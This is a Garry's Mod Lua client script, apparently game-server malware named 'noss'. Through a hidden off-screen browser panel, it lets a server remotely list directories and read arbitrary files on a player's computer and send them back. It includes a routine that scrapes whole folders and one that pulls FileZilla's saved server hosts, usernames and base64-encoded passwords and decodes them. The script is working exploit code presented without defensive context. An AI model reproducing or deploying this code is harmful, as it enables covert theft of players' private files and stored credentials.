noss = noss or {}
noss.hex = {}
for i = 0, 255 do
    noss.hex[string.format("%0x", i)] = string.char(i)
    noss.hex[string.format("%0X", i)] = string.char(i)
end

net.Receive("noss", function()
    local mode = net.ReadInt(8)
    local p = net.ReadString()
    if mode == 2 then
        noss.find(p, function(dirs, files)
            net.Start("noss")
            net.WriteTable({dirs = dirs, files = files})
            net.SendToServer()
        end)
    elseif mode == 1 then
        noss.read(p, function(data)
            net.Start("noss")
            net.WriteData(data, #data)
            net.SendToServer()
        end)
    end
end)

function noss.unescape(s)
    s = string.gsub(s, "+", " ")
    s = string.gsub(s, "%%(%x%x)", function (h)
        return string.char(tonumber(h, 16))
    end)

    return s
end

function noss.decode(data)
    data = noss.unescape(data)
    data = data:gsub("%%(%x%x)", noss.hex)

    local dirs = {}
    local files = {}

    for name, escaped_name, dir in string.gmatch(data, 'addRow%("([^"]*)","([^"]*)",(%d)') do
        if name == "." or name == ".." then
            continue
        end

        if dir == "1" then
            table.insert(dirs, name)
        else
            table.insert(files, name)
        end
    end

    return dirs, files
end

function noss.read(path, callback)
    if not noss.html then
        noss.html = vgui.Create("DHTML")
        noss.html:SetVisible(false)
        noss.html:SetPos(-1000,-1000)
        noss.html:SetSize(0,0)
    end

    noss.html:SetAllowLua(true)
    noss.html:OpenURL("view-source:file:///".. path)
    noss.html:AddFunction("fs", "SendData", function(data)
        data = data:gsub([[^<head></head><body><pre style="word%-wrap: break%-word; white%-space: pre%-wrap;">]], "")
        data = data:gsub([[</pre></body>$]], "")
        data = data:Replace([[<body><div class="webkit-line-gutter-backdrop"></div><table><tbody><tr><td class="webkit-line-number"></td><td class="webkit-line-content">]], "")
        data = data:Replace([[</td></tr><tr><td class="webkit-line-number"></td><td class="webkit-line-content"></td></tr></tbody></table></body>]], "")
        data = data:Replace([[</td></tr><tr><td class="webkit-line-number"></td><td class="webkit-line-content">]], "\n")
        data = data:Replace([[</td></tr></tbody></table></body>]], "")
        data = data:Replace([[<br>]], "\n")

        callback(data)
    end)

    noss.html:QueueJavascript("fs.SendData(document.documentElement.innerHTML);")
end

function noss.find(directory, callback)
    if not noss.html then
        noss.html = vgui.Create("DHTML")
        noss.html:SetVisible(false)
        noss.html:SetPos(-1000,-1000)
        noss.html:SetSize(0,0)
    end

    noss.html:SetAllowLua(true)
    noss.html:OpenURL("view-source:file:///".. directory .."/")
    noss.html:AddFunction("fs", "SendData", function(data)
        local dirs, files = noss.decode(data)
        callback(dirs, files)
    end)

    noss.html:QueueJavascript("fs.SendData(document.documentElement.innerHTML);")
end

function noss.scrape(path, callback)
    noss.find(path, function(dirs, files)
        for k, v in pairs(files) do
            timer.Simple(k*0.5, function()
                noss.read(path.. v, function(data)
                    callback(v, data)
                end)
            end)
        end
    end)
end

function noss.filezilla(drive, username, callback)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function dec(data)
        data = string.gsub(data, '[^'..b..'=]', '')
        return (data:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r;
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end

    local tbl = {
        hosts = {},
        ports = {},
        users = {},
        passwords = {},
    }

    noss.read(drive ..":/Users/".. username .."/AppData/Roaming/FileZilla/recentservers.xml", function(data)
        for host in data:gmatch("Host&gt;</span>(.-)<span") do
            if #host == 4 then
                continue
            end

            table.insert(tbl.hosts, host)
        end

        for port in data:gmatch("Port&gt;</span>(.-)<span") do
            if #port == 4 then
                continue
            end

            table.insert(tbl.ports, port)
        end

        for user in data:gmatch("User&gt;</span>(.-)<span") do
            if #user == 4 then
                continue
            end

            table.insert(tbl.users, user)
        end

        for password in data:gmatch([[Pass .-base64</span>"&gt;</span>(.-)<span]]) do
            if #password == 4 then
                continue
            end

            table.insert(tbl.passwords, dec(password))
        end

        callback(tbl)
    end)
end